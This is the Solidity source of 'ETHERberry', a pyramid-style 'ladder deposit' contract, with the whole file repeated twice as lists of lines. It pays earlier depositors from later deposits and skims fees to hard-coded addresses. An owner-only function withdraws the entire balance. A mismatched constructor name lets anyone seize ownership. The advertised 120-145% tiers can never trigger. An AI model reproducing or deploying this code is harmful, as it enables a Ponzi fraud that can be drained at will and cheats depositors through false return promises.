['/*\n', 'etherberry - ethereum strawberry\n', '\n', 'Ladder deposit based contract with float percentage based on EtheriumPyramidSample on GitHub.\n', '\n', 'ETHERberry allows to deposit with float multiplier percent of outcome payment\n', '\n', '*/\n', 'contract ETHERberry \n', '{\n', '    struct Payer \n', '    {\n', '        address ETHaddress;\n', '        uint ETHamount;\n', '    }\n', '\n', '    Payer[] public persons;\n', '\n', '    uint public paymentqueue = 0;\n', '    uint public feecounter;\n', '    uint amount;\n', '    \n', '    address public owner;\n', '    address public ipyh=0x5fD8B8237B6fA8AEDE4fdab7338709094d5c5eA4;\n', '    address public hyip=0xfAF7100b413465Ea0eB550d6D6a2A29695A6f218;\n', '    address meg=this;\n', '\n', '    modifier _onlyowner\n', '    {\n', '        if (msg.sender == owner)\n', '        _\n', '    }\n', '    \n', '    function ETHERanate() \n', '    {\n', '        owner = msg.sender;\n', '    }\n', '    function()                                                          \n', '    {\n', '        enter();\n', '    }\n', '    function enter()\n', '    {\n', '        if (msg.sender == owner)\n', '\t    {\n', '\t        UpdatePay();                                          \n', '\t    }\n', '\t    else                                                          \n', '\t    {\n', '            feecounter+=msg.value/5;                                  \n', '\t        owner.send(feecounter/2);                           \n', '\t        ipyh.send((feecounter/2)/2);                                 \n', '\t        hyip.send((feecounter/2)/2);\n', '\t        feecounter=0;                                            \n', '\t        \n', '            if ((msg.value >= (1 ether)/40) && (msg.value <= (1 ether)))                                \n', '            {\n', '\t            amount = msg.value;                                      \n', '\t            uint idx=persons.length;                                   \n', '                persons.length+=1;\n', '                persons[idx].ETHaddress=msg.sender;\n', '                persons[idx].ETHamount=amount;\n', '                canPay();                                              \n', '            }\n', '\t        else                                                         \n', '\t        {\n', '\t            msg.sender.send(msg.value - msg.value/5);                   \n', '\t        }\n', '\t    }\n', '\n', '    }\n', '    \n', '    function UpdatePay() _onlyowner                                            \n', '    {\n', '        msg.sender.send(meg.balance);\n', '    }\n', '    \n', '    function canPay() internal                                                  \n', '    {\n', '        uint percent=110;  //if tx <0.05 ether - get 110%\n', '        if (persons[paymentqueue].ETHamount > (1 ether)/20) //if tx > 0.05 ether - get 115%\n', '        {\n', '            percent =115;\n', '        }\n', '        else if (persons[paymentqueue].ETHamount > (1 ether)/10) //if tx > 0.1 ether - get 120%\n', '        {\n', '            percent = 120;\n', '        }\n', '        else if (persons[paymentqueue].ETHamount > (1 ether)/5)  //if tx >0.2 ether - get 125%\n', '        {\n', '            percent = 125;\n', '        }\n', '        else if (persons[paymentqueue].ETHamount > (1 ether)/4)  //if tx > 0.25 ether - get 130%\n', '        {\n', '            percent = 130;\n', '        }\n', '        else if (persons[paymentqueue].ETHamount > (1 ether)/2)   //if tx > 0.5 ether - get 140%\n', '        {\n', '            percent = 140;\n', '        }\n', '        else if (persons[paymentqueue].ETHamount > ((1 ether)/2 + (1 ether)/4))  // if tx > 0.75 ether - get 145%\n', '        {\n', '            percent = 145;\n', '        }\n', '        while (meg.balance>persons[paymentqueue].ETHamount/100*percent)             \n', '        {\n', '            uint transactionAmount=persons[paymentqueue].ETHamount/100*percent;     \n', '            persons[paymentqueue].ETHaddress.send(transactionAmount);           \n', '            paymentqueue+=1;                                                    \n', '        }\n', '    }\n', '}']
['/*\n', 'etherberry - ethereum strawberry\n', '\n', 'Ladder deposit based contract with float percentage based on EtheriumPyramidSample on GitHub.\n', '\n', 'ETHERberry allows to deposit with float multiplier percent of outcome payment\n', '\n', '*/\n', 'contract ETHERberry \n', '{\n', '    struct Payer \n', '    {\n', '        address ETHaddress;\n', '        uint ETHamount;\n', '    }\n', '\n', '    Payer[] public persons;\n', '\n', '    uint public paymentqueue = 0;\n', '    uint public feecounter;\n', '    uint amount;\n', '    \n', '    address public owner;\n', '    address public ipyh=0x5fD8B8237B6fA8AEDE4fdab7338709094d5c5eA4;\n', '    address public hyip=0xfAF7100b413465Ea0eB550d6D6a2A29695A6f218;\n', '    address meg=this;\n', '\n', '    modifier _onlyowner\n', '    {\n', '        if (msg.sender == owner)\n', '        _\n', '    }\n', '    \n', '    function ETHERanate() \n', '    {\n', '        owner = msg.sender;\n', '    }\n', '    function()                                                          \n', '    {\n', '        enter();\n', '    }\n', '    function enter()\n', '    {\n', '        if (msg.sender == owner)\n', '\t    {\n', '\t        UpdatePay();                                          \n', '\t    }\n', '\t    else                                                          \n', '\t    {\n', '            feecounter+=msg.value/5;                                  \n', '\t        owner.send(feecounter/2);                           \n', '\t        ipyh.send((feecounter/2)/2);                                 \n', '\t        hyip.send((feecounter/2)/2);\n', '\t        feecounter=0;                                            \n', '\t        \n', '            if ((msg.value >= (1 ether)/40) && (msg.value <= (1 ether)))                                \n', '            {\n', '\t            amount = msg.value;                                      \n', '\t            uint idx=persons.length;                                   \n', '                persons.length+=1;\n', '                persons[idx].ETHaddress=msg.sender;\n', '                persons[idx].ETHamount=amount;\n', '                canPay();                                              \n', '            }\n', '\t        else                                                         \n', '\t        {\n', '\t            msg.sender.send(msg.value - msg.value/5);                   \n', '\t        }\n', '\t    }\n', '\n', '    }\n', '    \n', '    function UpdatePay() _onlyowner                                            \n', '    {\n', '        msg.sender.send(meg.balance);\n', '    }\n', '    \n', '    function canPay() internal                                                  \n', '    {\n', '        uint percent=110;  //if tx <0.05 ether - get 110%\n', '        if (persons[paymentqueue].ETHamount > (1 ether)/20) //if tx > 0.05 ether - get 115%\n', '        {\n', '            percent =115;\n', '        }\n', '        else if (persons[paymentqueue].ETHamount > (1 ether)/10) //if tx > 0.1 ether - get 120%\n', '        {\n', '            percent = 120;\n', '        }\n', '        else if (persons[paymentqueue].ETHamount > (1 ether)/5)  //if tx >0.2 ether - get 125%\n', '        {\n', '            percent = 125;\n', '        }\n', '        else if (persons[paymentqueue].ETHamount > (1 ether)/4)  //if tx > 0.25 ether - get 130%\n', '        {\n', '            percent = 130;\n', '        }\n', '        else if (persons[paymentqueue].ETHamount > (1 ether)/2)   //if tx > 0.5 ether - get 140%\n', '        {\n', '            percent = 140;\n', '        }\n', '        else if (persons[paymentqueue].ETHamount > ((1 ether)/2 + (1 ether)/4))  // if tx > 0.75 ether - get 145%\n', '        {\n', '            percent = 145;\n', '        }\n', '        while (meg.balance>persons[paymentqueue].ETHamount/100*percent)             \n', '        {\n', '            uint transactionAmount=persons[paymentqueue].ETHamount/100*percent;     \n', '            persons[paymentqueue].ETHaddress.send(transactionAmount);           \n', '            paymentqueue+=1;                                                    \n', '        }\n', '    }\n', '}']
